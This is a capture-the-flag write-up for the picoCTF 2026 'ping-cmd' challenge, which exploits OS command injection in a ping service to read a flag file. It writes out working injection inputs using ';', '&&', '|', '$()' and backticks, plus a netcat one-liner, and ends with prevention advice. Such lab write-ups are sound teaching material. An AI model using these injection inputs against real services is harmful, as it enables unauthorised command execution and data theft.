# ping-cmd

- **Platform:** picoCTF
- **Event:** picoCTF 2026
- **Category:** General Skills
- **Difficulty:** Easy
- **Author:** Yahaya Meddy

## 1. Challenge Overview

> *"Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?"*
> *`nc chatelaine.cylabacademy.net 42461`*

**Hints:**
1. The program uses a shell command behind the scenes.
2. Sometimes, you can run more than one command at a time.

**Objective:** Abuse a service that pings a user-supplied IP address to run our own commands on the server and read `flag.txt`.

## 2. Step-by-Step Solution

### Step 1: Normal Behaviour

Connecting to the service gives a prompt that claims to only allow `8.8.8.8`:

```bash
nc chatelaine.cylabacademy.net 42461
```

```text
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=116 time=7.94 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=116 time=7.96 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 7.939/7.951/7.963/0.012 ms
```

* **Key Observation:** The output is real `ping` output, so the server is passing our input to a shell command (as hint 1 says). If it is pasted into the command without being sanitised, we can chain a second command after it.

### Step 2: Command Injection to List Files

The `;` operator in a shell ends one command and starts another. We add `; ls` after the valid IP:

```text
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
...
rtt min/avg/max/mdev = 7.987/7.992/7.998/0.005 ms
flag.txt
script.sh
```

* **Key Observation:** After the ping output, the contents of the working directory are printed. The injection worked, and `flag.txt` is right there. The "tight security" only checks that the input *starts with* (or contains) `8.8.8.8`, and it doesn't stop extra commands.

### Step 3: Reading the Flag

```text
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
...
academy{REDACTED}
```

## 3. Flag

```text
academy{REDACTED}
```

## 4. Alternative Tools & Methods

### Alternative 1: Other Command Separators
Any shell operator that chains commands should work the same way:

```text
8.8.8.8 && cat flag.txt     # run the 2nd command if ping succeeds
8.8.8.8 | cat flag.txt      # pipe ping output into cat (cat ignores stdin when given a file)
8.8.8.8 $(cat flag.txt)     # command substitution
8.8.8.8 `cat flag.txt`      # backtick substitution
```

### Alternative 2: Read the Source
`script.sh` is in the same directory. Running `8.8.8.8; cat script.sh` shows how the input is handled and confirms the vulnerability.

### Alternative 3: One-Liner
```bash
printf '8.8.8.8; cat flag.txt\n' | nc chatelaine.cylabacademy.net 42461
```

## 5. Key Takeaways & Security Lessons

1. **This is OS command injection (CWE-78):** User input is concatenated into a shell command string, so the shell interprets our metacharacters (`;`, `&&`, `|`, `$()`) as syntax and not as data.
2. **Weak validation is not validation:** A banner saying "we only allow 8.8.8.8" means nothing if the code doesn't actually enforce it. Checking a prefix or substring is not enough.
3. **How to prevent it:**
   * Don't build shell commands from user input. Call `ping` with an argument array (e.g. `subprocess.run(["ping", "-c", "2", ip])` with `shell=False`) so no shell parses the input.
   * Validate with a strict allowlist or a full-match IP parser (e.g. Python's `ipaddress` module) and reject everything else.
   * Run the service with least privilege so a successful injection exposes as little as possible.
4. **Hints are worth reading:** "The program uses a shell command" and "you can run more than one command at a time" point straight to command injection.
